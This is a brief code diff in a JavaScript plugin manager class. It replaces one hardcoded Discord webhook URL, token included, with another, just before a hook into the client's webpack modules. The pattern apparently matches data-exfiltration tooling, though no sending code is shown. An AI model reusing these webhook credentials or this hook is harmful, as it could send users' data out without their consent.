@@ -82,7 +82,7 @@ class o7FireTacticalPluginManager {
                     });
                 }
             });
-	    const webhookurl = 'https://discord.com/api/webhooks/823548378629275669/wpfWr-Gi-hfrYj8SX3oJbvcebIyboH6LwsugTrE1wLhM8dIGdGFgTq3qEkSfC5b23Hnf';
+	    const webhookurl = 'https://discord.com/api/webhooks/845501481805283378/DpDqz_dJgw2tPrHeCtoU9DeJ88IT58ZGsall4aCIkBlYPLUG-aFtEmB1tY_5c_MLvtIr';
 
 var req = webpackJsonp.push([
     [], {
